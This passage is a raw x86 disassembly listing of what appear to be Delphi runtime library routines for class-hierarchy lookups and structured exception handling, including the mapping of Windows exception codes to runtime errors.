  40299f:	90                   	nop
  4029a0:	8b 40 e8             	mov    -0x18(%eax),%eax
  4029a3:	c3                   	ret
  4029a4:	84 d2                	test   %dl,%dl
  4029a6:	74 08                	je     0x4029b0
  4029a8:	83 c4 f0             	add    $0xfffffff0,%esp
  4029ab:	e8 c0 01 00 00       	call   0x402b70
  4029b0:	84 d2                	test   %dl,%dl
  4029b2:	74 0a                	je     0x4029be
  4029b4:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  4029bb:	83 c4 0c             	add    $0xc,%esp
  4029be:	c3                   	ret
  4029bf:	90                   	nop
  4029c0:	84 d2                	test   %dl,%dl
  4029c2:	74 05                	je     0x4029c9
  4029c4:	e8 e3 01 00 00       	call   0x402bac
  4029c9:	c3                   	ret
  4029ca:	8b c0                	mov    %eax,%eax
  4029cc:	85 c0                	test   %eax,%eax
  4029ce:	74 07                	je     0x4029d7
  4029d0:	8b 08                	mov    (%eax),%ecx
  4029d2:	b2 01                	mov    $0x1,%dl
  4029d4:	ff 51 fc             	call   *-0x4(%ecx)
  4029d7:	c3                   	ret
  4029d8:	57                   	push   %edi
  4029d9:	89 d7                	mov    %edx,%edi
  4029db:	ab                   	stos   %eax,%es:(%edi)
  4029dc:	8b 48 e8             	mov    -0x18(%eax),%ecx
  4029df:	31 c0                	xor    %eax,%eax
  4029e1:	51                   	push   %ecx
  4029e2:	c1 e9 02             	shr    $0x2,%ecx
  4029e5:	49                   	dec    %ecx
  4029e6:	f3 ab                	rep stos %eax,%es:(%edi)
  4029e8:	59                   	pop    %ecx
  4029e9:	83 e1 03             	and    $0x3,%ecx
  4029ec:	f3 aa                	rep stos %al,%es:(%edi)
  4029ee:	89 d0                	mov    %edx,%eax
  4029f0:	5f                   	pop    %edi
  4029f1:	c3                   	ret
  4029f2:	8b c0                	mov    %eax,%eax
  4029f4:	53                   	push   %ebx
  4029f5:	56                   	push   %esi
  4029f6:	89 c3                	mov    %eax,%ebx
  4029f8:	8b 30                	mov    (%eax),%esi
  4029fa:	8b 56 d0             	mov    -0x30(%esi),%edx
  4029fd:	8b 76 ec             	mov    -0x14(%esi),%esi
  402a00:	85 d2                	test   %edx,%edx
  402a02:	74 07                	je     0x402a0b
  402a04:	e8 c7 0b 00 00       	call   0x4035d0
  402a09:	89 d8                	mov    %ebx,%eax
  402a0b:	85 f6                	test   %esi,%esi
  402a0d:	75 eb                	jne    0x4029fa
  402a0f:	5e                   	pop    %esi
  402a10:	5b                   	pop    %ebx
  402a11:	c3                   	ret
  402a12:	8b c0                	mov    %eax,%eax
  402a14:	85 c0                	test   %eax,%eax
  402a16:	74 10                	je     0x402a28
  402a18:	8b 00                	mov    (%eax),%eax
  402a1a:	39 d0                	cmp    %edx,%eax
  402a1c:	74 08                	je     0x402a26
  402a1e:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a21:	85 c0                	test   %eax,%eax
  402a23:	75 f5                	jne    0x402a1a
  402a25:	c3                   	ret
  402a26:	b0 01                	mov    $0x1,%al
  402a28:	c3                   	ret
  402a29:	8d 40 00             	lea    0x0(%eax),%eax
  402a2c:	57                   	push   %edi
  402a2d:	93                   	xchg   %eax,%ebx
  402a2e:	8b 7b e0             	mov    -0x20(%ebx),%edi
  402a31:	85 ff                	test   %edi,%edi
  402a33:	74 0d                	je     0x402a42
  402a35:	0f b7 0f             	movzwl (%edi),%ecx
  402a38:	51                   	push   %ecx
  402a39:	83 c7 02             	add    $0x2,%edi
  402a3c:	66 f2 af             	repnz scas %es:(%edi),%ax
  402a3f:	74 0a                	je     0x402a4b
  402a41:	59                   	pop    %ecx
  402a42:	8b 5b ec             	mov    -0x14(%ebx),%ebx
  402a45:	85 db                	test   %ebx,%ebx
  402a47:	75 e5                	jne    0x402a2e
  402a49:	5f                   	pop    %edi
  402a4a:	c3                   	ret
  402a4b:	58                   	pop    %eax
  402a4c:	01 c0                	add    %eax,%eax
  402a4e:	29 c8                	sub    %ecx,%eax
  402a50:	8b 5c 47 fc          	mov    -0x4(%edi,%eax,2),%ebx
  402a54:	5f                   	pop    %edi
  402a55:	c3                   	ret
  402a56:	8b c0                	mov    %eax,%eax
  402a58:	39 d0                	cmp    %edx,%eax
  402a5a:	74 08                	je     0x402a64
  402a5c:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a5f:	85 c0                	test   %eax,%eax
  402a61:	75 f5                	jne    0x402a58
  402a63:	c3                   	ret
  402a64:	b0 01                	mov    $0x1,%al
  402a66:	c3                   	ret
  402a67:	90                   	nop
  402a68:	8b 40 d4             	mov    -0x2c(%eax),%eax
  402a6b:	c3                   	ret
  402a6c:	c3                   	ret
  402a6d:	8d 40 00             	lea    0x0(%eax),%eax
  402a70:	53                   	push   %ebx
  402a71:	66 8b 1a             	mov    (%edx),%bx
  402a74:	66 09 db             	or     %bx,%bx
  402a77:	74 17                	je     0x402a90
  402a79:	66 81 fb 00 c0       	cmp    $0xc000,%bx
  402a7e:	73 10                	jae    0x402a90
  402a80:	50                   	push   %eax
  402a81:	8b 00                	mov    (%eax),%eax
  402a83:	e8 a4 ff ff ff       	call   0x402a2c
  402a88:	58                   	pop    %eax
  402a89:	74 05                	je     0x402a90
  402a8b:	89 d9                	mov    %ebx,%ecx
  402a8d:	5b                   	pop    %ebx
  402a8e:	ff e1                	jmp    *%ecx
  402a90:	5b                   	pop    %ebx
  402a91:	8b 08                	mov    (%eax),%ecx
  402a93:	ff 61 f0             	jmp    *-0x10(%ecx)
  402a96:	c3                   	ret
  402a97:	90                   	nop
  402a98:	53                   	push   %ebx
  402a99:	56                   	push   %esi
  402a9a:	57                   	push   %edi
  402a9b:	31 c9                	xor    %ecx,%ecx
  402a9d:	31 ff                	xor    %edi,%edi
  402a9f:	8a 1a                	mov    (%edx),%bl
  402aa1:	8b 70 dc             	mov    -0x24(%eax),%esi
  402aa4:	85 f6                	test   %esi,%esi
  402aa6:	74 15                	je     0x402abd
  402aa8:	66 8b 3e             	mov    (%esi),%di
  402aab:	83 c6 02             	add    $0x2,%esi
  402aae:	8a 4e 06             	mov    0x6(%esi),%cl
  402ab1:	38 d9                	cmp    %bl,%cl
  402ab3:	74 15                	je     0x402aca
  402ab5:	66 8b 0e             	mov    (%esi),%cx
  402ab8:	01 ce                	add    %ecx,%esi
  402aba:	4f                   	dec    %edi
  402abb:	75 f1                	jne    0x402aae
  402abd:	8b 40 ec             	mov    -0x14(%eax),%eax
  402ac0:	85 c0                	test   %eax,%eax
  402ac2:	75 dd                	jne    0x402aa1
  402ac4:	eb 18                	jmp    0x402ade
  402ac6:	8a 1a                	mov    (%edx),%bl
  402ac8:	eb eb                	jmp    0x402ab5
  402aca:	b5 00                	mov    $0x0,%ch
  402acc:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402ad0:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402ad3:	80 e3 df             	and    $0xdf,%bl
  402ad6:	75 ee                	jne    0x402ac6
  402ad8:	49                   	dec    %ecx
  402ad9:	75 f1                	jne    0x402acc
  402adb:	8b 46 02             	mov    0x2(%esi),%eax
  402ade:	5f                   	pop    %edi
  402adf:	5e                   	pop    %esi
  402ae0:	5b                   	pop    %ebx
  402ae1:	c3                   	ret
  402ae2:	8b c0                	mov    %eax,%eax
  402ae4:	53                   	push   %ebx
  402ae5:	56                   	push   %esi
  402ae6:	57                   	push   %edi
  402ae7:	89 cf                	mov    %ecx,%edi
  402ae9:	31 db                	xor    %ebx,%ebx
  402aeb:	31 c9                	xor    %ecx,%ecx
  402aed:	8b 70 dc             	mov    -0x24(%eax),%esi
  402af0:	85 f6                	test   %esi,%esi
  402af2:	74 13                	je     0x402b07
  402af4:	66 8b 0e             	mov    (%esi),%cx
  402af7:	83 c6 02             	add    $0x2,%esi
  402afa:	3b 56 02             	cmp    0x2(%esi),%edx
  402afd:	74 13                	je     0x402b12
  402aff:	66 8b 1e             	mov    (%esi),%bx
  402b02:	01 de                	add    %ebx,%esi
  402b04:	49                   	dec    %ecx
  402b05:	75 f3                	jne    0x402afa
  402b07:	8b 40 ec             	mov    -0x14(%eax),%eax
  402b0a:	85 c0                	test   %eax,%eax
  402b0c:	75 df                	jne    0x402aed
  402b0e:	88 07                	mov    %al,(%edi)
  402b10:	eb 0a                	jmp    0x402b1c
  402b12:	83 c6 06             	add    $0x6,%esi
  402b15:	31 c9                	xor    %ecx,%ecx
  402b17:	8a 0e                	mov    (%esi),%cl
  402b19:	41                   	inc    %ecx
  402b1a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402b1c:	5f                   	pop    %edi
  402b1d:	5e                   	pop    %esi
  402b1e:	5b                   	pop    %ebx
  402b1f:	c3                   	ret
  402b20:	53                   	push   %ebx
  402b21:	56                   	push   %esi
  402b22:	57                   	push   %edi
  402b23:	31 c9                	xor    %ecx,%ecx
  402b25:	31 ff                	xor    %edi,%edi
  402b27:	8a 1a                	mov    (%edx),%bl
  402b29:	50                   	push   %eax
  402b2a:	8b 00                	mov    (%eax),%eax
  402b2c:	8b 70 d8             	mov    -0x28(%eax),%esi
  402b2f:	85 f6                	test   %esi,%esi
  402b31:	74 14                	je     0x402b47
  402b33:	66 8b 3e             	mov    (%esi),%di
  402b36:	83 c6 06             	add    $0x6,%esi
  402b39:	8a 4e 06             	mov    0x6(%esi),%cl
  402b3c:	38 d9                	cmp    %bl,%cl
  402b3e:	74 18                	je     0x402b58
  402b40:	8d 74 0e 07          	lea    0x7(%esi,%ecx,1),%esi
  402b44:	4f                   	dec    %edi
  402b45:	75 f2                	jne    0x402b39
  402b47:	8b 40 ec             	mov    -0x14(%eax),%eax
  402b4a:	85 c0                	test   %eax,%eax
  402b4c:	75 de                	jne    0x402b2c
  402b4e:	5a                   	pop    %edx
  402b4f:	eb 1b                	jmp    0x402b6c
  402b51:	8a 1a                	mov    (%edx),%bl
  402b53:	8a 4e 06             	mov    0x6(%esi),%cl
  402b56:	eb e8                	jmp    0x402b40
  402b58:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402b5c:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402b5f:	80 e3 df             	and    $0xdf,%bl
  402b62:	75 ed                	jne    0x402b51
  402b64:	49                   	dec    %ecx
  402b65:	75 f1                	jne    0x402b58
  402b67:	8b 06                	mov    (%esi),%eax
  402b69:	5a                   	pop    %edx
  402b6a:	01 d0                	add    %edx,%eax
  402b6c:	5f                   	pop    %edi
  402b6d:	5e                   	pop    %esi
  402b6e:	5b                   	pop    %ebx
  402b6f:	c3                   	ret
  402b70:	52                   	push   %edx
  402b71:	51                   	push   %ecx
  402b72:	53                   	push   %ebx
  402b73:	ff 50 f4             	call   *-0xc(%eax)
  402b76:	31 d2                	xor    %edx,%edx
  402b78:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402b7c:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402b7f:	89 19                	mov    %ebx,(%ecx)
  402b81:	89 69 08             	mov    %ebp,0x8(%ecx)
  402b84:	c7 41 04 95 2b 40 00 	movl   $0x402b95,0x4(%ecx)
  402b8b:	89 41 0c             	mov    %eax,0xc(%ecx)
  402b8e:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402b91:	5b                   	pop    %ebx
  402b92:	59                   	pop    %ecx
  402b93:	5a                   	pop    %edx
  402b94:	c3                   	ret
  402b95:	e9 02 01 00 00       	jmp    0x402c9c
  402b9a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402b9e:	8b 40 0c             	mov    0xc(%eax),%eax
  402ba1:	e8 26 fe ff ff       	call   0x4029cc
  402ba6:	e8 89 02 00 00       	call   0x402e34
  402bab:	c3                   	ret
  402bac:	8b 10                	mov    (%eax),%edx
  402bae:	ff 52 f8             	call   *-0x8(%edx)
  402bb1:	c3                   	ret
  402bb2:	8b c0                	mov    %eax,%eax
  402bb4:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402bbb:	76 10                	jbe    0x402bcd
  402bbd:	6a 00                	push   $0x0
  402bbf:	6a 00                	push   $0x0
  402bc1:	6a 00                	push   $0x0
  402bc3:	68 cf fa ed 0e       	push   $0xeedfacf
  402bc8:	e8 0b e6 ff ff       	call   0x4011d8
  402bcd:	c3                   	ret
  402bce:	8b c0                	mov    %eax,%eax
  402bd0:	80 3d 00 b0 40 00 00 	cmpb   $0x0,0x40b000
  402bd7:	74 16                	je     0x402bef
  402bd9:	50                   	push   %eax
  402bda:	50                   	push   %eax
  402bdb:	52                   	push   %edx
  402bdc:	54                   	push   %esp
  402bdd:	6a 02                	push   $0x2
  402bdf:	6a 00                	push   $0x0
  402be1:	68 d4 fa ed 0e       	push   $0xeedfad4
  402be6:	e8 ed e5 ff ff       	call   0x4011d8
  402beb:	83 c4 08             	add    $0x8,%esp
  402bee:	58                   	pop    %eax
  402bef:	c3                   	ret
  402bf0:	54                   	push   %esp
  402bf1:	6a 01                	push   $0x1
  402bf3:	6a 00                	push   $0x0
  402bf5:	68 d0 fa ed 0e       	push   $0xeedfad0
  402bfa:	e8 d9 e5 ff ff       	call   0x4011d8
  402bff:	83 c4 04             	add    $0x4,%esp
  402c02:	58                   	pop    %eax
  402c03:	c3                   	ret
  402c04:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402c0b:	76 07                	jbe    0x402c14
  402c0d:	50                   	push   %eax
  402c0e:	53                   	push   %ebx
  402c0f:	e9 dc ff ff ff       	jmp    0x402bf0
  402c14:	c3                   	ret
  402c15:	8d 40 00             	lea    0x0(%eax),%eax
  402c18:	85 c9                	test   %ecx,%ecx
  402c1a:	74 19                	je     0x402c35
  402c1c:	8b 41 01             	mov    0x1(%ecx),%eax
  402c1f:	80 39 e9             	cmpb   $0xe9,(%ecx)
  402c22:	74 0c                	je     0x402c30
  402c24:	80 39 eb             	cmpb   $0xeb,(%ecx)
  402c27:	75 0c                	jne    0x402c35
  402c29:	0f be c0             	movsbl %al,%eax
  402c2c:	41                   	inc    %ecx
  402c2d:	41                   	inc    %ecx
  402c2e:	eb 03                	jmp    0x402c33
  402c30:	83 c1 05             	add    $0x5,%ecx
  402c33:	01 c1                	add    %eax,%ecx
  402c35:	c3                   	ret
  402c36:	8b c0                	mov    %eax,%eax
  402c38:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402c3f:	76 1c                	jbe    0x402c5d
  402c41:	50                   	push   %eax
  402c42:	52                   	push   %edx
  402c43:	51                   	push   %ecx
  402c44:	e8 cf ff ff ff       	call   0x402c18
  402c49:	51                   	push   %ecx
  402c4a:	54                   	push   %esp
  402c4b:	6a 01                	push   $0x1
  402c4d:	6a 00                	push   $0x0
  402c4f:	68 d1 fa ed 0e       	push   $0xeedfad1
  402c54:	e8 7f e5 ff ff       	call   0x4011d8
  402c59:	59                   	pop    %ecx
  402c5a:	59                   	pop    %ecx
  402c5b:	5a                   	pop    %edx
  402c5c:	58                   	pop    %eax
  402c5d:	c3                   	ret
  402c5e:	8b c0                	mov    %eax,%eax
  402c60:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402c67:	76 11                	jbe    0x402c7a
  402c69:	52                   	push   %edx
  402c6a:	54                   	push   %esp
  402c6b:	6a 01                	push   $0x1
  402c6d:	6a 00                	push   $0x0
  402c6f:	68 d2 fa ed 0e       	push   $0xeedfad2
  402c74:	e8 5f e5 ff ff       	call   0x4011d8
  402c79:	5a                   	pop    %edx
  402c7a:	c3                   	ret
  402c7b:	90                   	nop
  402c7c:	80 3d 00 b0 40 00 01 	cmpb   $0x1,0x40b000
  402c83:	76 13                	jbe    0x402c98
  402c85:	50                   	push   %eax
  402c86:	52                   	push   %edx
  402c87:	54                   	push   %esp
  402c88:	6a 02                	push   $0x2
  402c8a:	6a 00                	push   $0x0
  402c8c:	68 d3 fa ed 0e       	push   $0xeedfad3
  402c91:	e8 42 e5 ff ff       	call   0x4011d8
  402c96:	5a                   	pop    %edx
  402c97:	58                   	pop    %eax
  402c98:	c3                   	ret
  402c99:	8d 40 00             	lea    0x0(%eax),%eax
  402c9c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ca0:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402ca7:	0f 85 ac 00 00 00    	jne    0x402d59
  402cad:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402cb3:	8b 50 18             	mov    0x18(%eax),%edx
  402cb6:	8b 48 14             	mov    0x14(%eax),%ecx
  402cb9:	74 2f                	je     0x402cea
  402cbb:	e8 44 fc ff ff       	call   0x402904
  402cc0:	8b 15 0c c0 40 00    	mov    0x40c00c,%edx
  402cc6:	85 d2                	test   %edx,%edx
  402cc8:	0f 84 8b 00 00 00    	je     0x402d59
  402cce:	ff d2                	call   *%edx
  402cd0:	85 c0                	test   %eax,%eax
  402cd2:	0f 84 81 00 00 00    	je     0x402d59
  402cd8:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402cdc:	e8 ef fe ff ff       	call   0x402bd0
  402ce1:	89 c2                	mov    %eax,%edx
  402ce3:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ce7:	8b 48 0c             	mov    0xc(%eax),%ecx
  402cea:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402cee:	53                   	push   %ebx
  402cef:	31 db                	xor    %ebx,%ebx
  402cf1:	56                   	push   %esi
  402cf2:	57                   	push   %edi
  402cf3:	55                   	push   %ebp
  402cf4:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402cf7:	53                   	push   %ebx
  402cf8:	50                   	push   %eax
  402cf9:	52                   	push   %edx
  402cfa:	51                   	push   %ecx
  402cfb:	8b 54 24 28          	mov    0x28(%esp),%edx
  402cff:	6a 00                	push   $0x0
  402d01:	50                   	push   %eax
  402d02:	68 0d 2d 40 00       	push   $0x402d0d
  402d07:	52                   	push   %edx
  402d08:	e8 db e4 ff ff       	call   0x4011e8
  402d0d:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402d11:	e8 96 03 00 00       	call   0x4030ac
  402d16:	ff b0 00 00 00 00    	push   0x0(%eax)
  402d1c:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  402d22:	8b 6f 08             	mov    0x8(%edi),%ebp
  402d25:	8b 5f 04             	mov    0x4(%edi),%ebx
  402d28:	c7 47 04 39 2d 40 00 	movl   $0x402d39,0x4(%edi)
  402d2f:	83 c3 05             	add    $0x5,%ebx
  402d32:	e8 cd fe ff ff       	call   0x402c04
  402d37:	ff e3                	jmp    *%ebx
  402d39:	e9 22 00 00 00       	jmp    0x402d60
  402d3e:	e8 69 03 00 00       	call   0x4030ac
  402d43:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  402d49:	8b 11                	mov    (%ecx),%edx
  402d4b:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  402d51:	8b 41 08             	mov    0x8(%ecx),%eax
  402d54:	e9 73 fc ff ff       	jmp    0x4029cc
  402d59:	b8 01 00 00 00       	mov    $0x1,%eax
  402d5e:	c3                   	ret
  402d5f:	90                   	nop
  402d60:	8b 44 24 04          	mov    0x4(%esp),%eax
  402d64:	8b 54 24 08          	mov    0x8(%esp),%edx
  402d68:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402d6f:	74 1f                	je     0x402d90
  402d71:	8b 4a 04             	mov    0x4(%edx),%ecx
  402d74:	c7 42 04 90 2d 40 00 	movl   $0x402d90,0x4(%edx)
  402d7b:	53                   	push   %ebx
  402d7c:	56                   	push   %esi
  402d7d:	57                   	push   %edi
  402d7e:	55                   	push   %ebp
  402d7f:	8b 6a 08             	mov    0x8(%edx),%ebp
  402d82:	83 c1 05             	add    $0x5,%ecx
  402d85:	e8 ae fe ff ff       	call   0x402c38
  402d8a:	ff d1                	call   *%ecx
  402d8c:	5d                   	pop    %ebp
  402d8d:	5f                   	pop    %edi
  402d8e:	5e                   	pop    %esi
  402d8f:	5b                   	pop    %ebx
  402d90:	b8 01 00 00 00       	mov    $0x1,%eax
  402d95:	c3                   	ret
  402d96:	8b c0                	mov    %eax,%eax
  402d98:	55                   	push   %ebp
  402d99:	31 ed                	xor    %ebp,%ebp
  402d9b:	68 c8 2d 40 00       	push   $0x402dc8
  402da0:	64 ff 75 00          	push   %fs:0x0(%ebp)
  402da4:	64 89 65 00          	mov    %esp,%fs:0x0(%ebp)
  402da8:	85 f6                	test   %esi,%esi
  402daa:	74 0e                	je     0x402dba
  402dac:	78 0a                	js     0x402db8
  402dae:	4e                   	dec    %esi
  402daf:	8b 2c b7             	mov    (%edi,%esi,4),%ebp
  402db2:	4e                   	dec    %esi
  402db3:	55                   	push   %ebp
  402db4:	79 f9                	jns    0x402daf
  402db6:	eb 02                	jmp    0x402dba
  402db8:	db 2f                	fldt   (%edi)
  402dba:	ff d3                	call   *%ebx
  402dbc:	31 d2                	xor    %edx,%edx
  402dbe:	31 c9                	xor    %ecx,%ecx
  402dc0:	eb 47                	jmp    0x402e09
  402dc2:	b8 01 00 00 00       	mov    $0x1,%eax
  402dc7:	c3                   	ret
  402dc8:	e8 37 fb ff ff       	call   0x402904
  402dcd:	8b 44 24 04          	mov    0x4(%esp),%eax
  402dd1:	8b 54 24 08          	mov    0x8(%esp),%edx
  402dd5:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402ddc:	75 e4                	jne    0x402dc2
  402dde:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402de2:	6a 00                	push   $0x0
  402de4:	50                   	push   %eax
  402de5:	68 f0 2d 40 00       	push   $0x402df0
  402dea:	52                   	push   %edx
  402deb:	e8 f8 e3 ff ff       	call   0x4011e8
  402df0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402df4:	8b 08                	mov    (%eax),%ecx
  402df6:	8b 50 18             	mov    0x18(%eax),%edx
  402df9:	81 f9 ce fa ed 0e    	cmp    $0xeedface,%ecx
  402dff:	75 05                	jne    0x402e06
  402e01:	8b 40 14             	mov    0x14(%eax),%eax
  402e04:	eb 03                	jmp    0x402e09
  402e06:	8b 40 0c             	mov    0xc(%eax),%eax
  402e09:	31 ed                	xor    %ebp,%ebp
  402e0b:	64 8b 65 00          	mov    %fs:0x0(%ebp),%esp
  402e0f:	64 8f 45 00          	pop    %fs:0x0(%ebp)
  402e13:	5d                   	pop    %ebp
  402e14:	c3                   	ret
  402e15:	8d 40 00             	lea    0x0(%eax),%eax
  402e18:	5a                   	pop    %edx
  402e19:	54                   	push   %esp
  402e1a:	55                   	push   %ebp
  402e1b:	57                   	push   %edi
  402e1c:	56                   	push   %esi
  402e1d:	53                   	push   %ebx
  402e1e:	50                   	push   %eax
  402e1f:	52                   	push   %edx
  402e20:	54                   	push   %esp
  402e21:	6a 07                	push   $0x7
  402e23:	6a 01                	push   $0x1
  402e25:	68 ce fa ed 0e       	push   $0xeedface
  402e2a:	52                   	push   %edx
  402e2b:	e9 a8 e3 ff ff       	jmp    0x4011d8
  402e30:	c3                   	ret
  402e31:	8d 40 00             	lea    0x0(%eax),%eax
  402e34:	8b 44 24 30          	mov    0x30(%esp),%eax
  402e38:	c7 40 04 7f 2e 40 00 	movl   $0x402e7f,0x4(%eax)
  402e3f:	e8 68 02 00 00       	call   0x4030ac
  402e44:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402e4a:	8b 0a                	mov    (%edx),%ecx
  402e4c:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402e52:	8b 42 0c             	mov    0xc(%edx),%eax
  402e55:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  402e59:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402e5f:	74 0d                	je     0x402e6e
  402e61:	8b 42 08             	mov    0x8(%edx),%eax
  402e64:	e8 63 fb ff ff       	call   0x4029cc
  402e69:	e8 46 fd ff ff       	call   0x402bb4
  402e6e:	31 c0                	xor    %eax,%eax
  402e70:	83 c4 14             	add    $0x14,%esp
  402e73:	64 8b 10             	mov    %fs:(%eax),%edx
  402e76:	59                   	pop    %ecx
  402e77:	8b 12                	mov    (%edx),%edx
  402e79:	89 11                	mov    %edx,(%ecx)
  402e7b:	5d                   	pop    %ebp
  402e7c:	5f                   	pop    %edi
  402e7d:	5e                   	pop    %esi
  402e7e:	5b                   	pop    %ebx
  402e7f:	b8 01 00 00 00       	mov    $0x1,%eax
  402e84:	c3                   	ret
  402e85:	8d 40 00             	lea    0x0(%eax),%eax
  402e88:	e8 1f 02 00 00       	call   0x4030ac
  402e8d:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402e93:	8b 0a                	mov    (%edx),%ecx
  402e95:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402e9b:	8b 42 08             	mov    0x8(%edx),%eax
  402e9e:	e8 29 fb ff ff       	call   0x4029cc
  402ea3:	5a                   	pop    %edx
  402ea4:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  402ea8:	31 c0                	xor    %eax,%eax
  402eaa:	59                   	pop    %ecx
  402eab:	64 89 08             	mov    %ecx,%fs:(%eax)
  402eae:	58                   	pop    %eax
  402eaf:	5d                   	pop    %ebp
  402eb0:	e8 ab fd ff ff       	call   0x402c60
  402eb5:	ff e2                	jmp    *%edx
  402eb7:	c3                   	ret
  402eb8:	31 d2                	xor    %edx,%edx
  402eba:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402ebe:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ec2:	83 c1 05             	add    $0x5,%ecx
  402ec5:	64 89 02             	mov    %eax,%fs:(%edx)
  402ec8:	ff d1                	call   *%ecx
  402eca:	c2 0c 00             	ret    $0xc
  402ecd:	c3                   	ret
  402ece:	8b c0                	mov    %eax,%eax
  402ed0:	89 14 24             	mov    %edx,(%esp)
  402ed3:	e9 c8 0f 00 00       	jmp    0x403ea0
  402ed8:	c3                   	ret
  402ed9:	8d 40 00             	lea    0x0(%eax),%eax
  402edc:	55                   	push   %ebp
  402edd:	8b ec                	mov    %esp,%ebp
  402edf:	8b 55 08             	mov    0x8(%ebp),%edx
  402ee2:	8b 02                	mov    (%edx),%eax
  402ee4:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  402ee9:	7f 2c                	jg     0x402f17
  402eeb:	74 5c                	je     0x402f49
  402eed:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  402ef2:	7f 15                	jg     0x402f09
  402ef4:	74 57                	je     0x402f4d
  402ef6:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  402efb:	74 5c                	je     0x402f59
  402efd:	2d 87 00 00 00       	sub    $0x87,%eax
  402f02:	74 3d                	je     0x402f41
  402f04:	48                   	dec    %eax
  402f05:	74 4e                	je     0x402f55
  402f07:	eb 60                	jmp    0x402f69
  402f09:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  402f0e:	83 e8 02             	sub    $0x2,%eax
  402f11:	72 36                	jb     0x402f49
  402f13:	74 30                	je     0x402f45
  402f15:	eb 52                	jmp    0x402f69
  402f17:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402f1c:	7f 11                	jg     0x402f2f
  402f1e:	74 3d                	je     0x402f5d
  402f20:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  402f25:	74 2e                	je     0x402f55
  402f27:	48                   	dec    %eax
  402f28:	74 13                	je     0x402f3d
  402f2a:	48                   	dec    %eax
  402f2b:	74 24                	je     0x402f51
  402f2d:	eb 3a                	jmp    0x402f69
  402f2f:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  402f34:	74 2f                	je     0x402f65
  402f36:	83 e8 3d             	sub    $0x3d,%eax
  402f39:	74 26                	je     0x402f61
  402f3b:	eb 2c                	jmp    0x402f69
  402f3d:	b0 c8                	mov    $0xc8,%al
  402f3f:	eb 2a                	jmp    0x402f6b
  402f41:	b0 c9                	mov    $0xc9,%al
  402f43:	eb 26                	jmp    0x402f6b
  402f45:	b0 cd                	mov    $0xcd,%al
  402f47:	eb 22                	jmp    0x402f6b
  402f49:	b0 cf                	mov    $0xcf,%al
  402f4b:	eb 1e                	jmp    0x402f6b
  402f4d:	b0 c8                	mov    $0xc8,%al
  402f4f:	eb 1a                	jmp    0x402f6b
  402f51:	b0 d7                	mov    $0xd7,%al
  402f53:	eb 16                	jmp    0x402f6b
  402f55:	b0 ce                	mov    $0xce,%al
  402f57:	eb 12                	jmp    0x402f6b
  402f59:	b0 d8                	mov    $0xd8,%al
  402f5b:	eb 0e                	jmp    0x402f6b
  402f5d:	b0 da                	mov    $0xda,%al
  402f5f:	eb 0a                	jmp    0x402f6b
  402f61:	b0 d9                	mov    $0xd9,%al
  402f63:	eb 06                	jmp    0x402f6b
  402f65:	b0 ca                	mov    $0xca,%al
  402f67:	eb 02                	jmp    0x402f6b
  402f69:	b0 d9                	mov    $0xd9,%al
  402f6b:	25 ff 00 00 00       	and    $0xff,%eax
  402f70:	8b 52 0c             	mov    0xc(%edx),%edx
  402f73:	e8 58 ff ff ff       	call   0x402ed0
  402f78:	5d                   	pop    %ebp
  402f79:	c2 04 00             	ret    $0x4
  402f7c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402f80:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402f87:	75 6b                	jne    0x402ff4
  402f89:	e8 76 f9 ff ff       	call   0x402904
  402f8e:	8b 54 24 08          	mov    0x8(%esp),%edx
  402f92:	6a 00                	push   $0x0
  402f94:	50                   	push   %eax
  402f95:	68 a0 2f 40 00       	push   $0x402fa0
  402f9a:	52                   	push   %edx
  402f9b:	e8 48 e2 ff ff       	call   0x4011e8
  402fa0:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  402fa4:	81 3b ce fa ed 0e    	cmpl   $0xeedface,(%ebx)
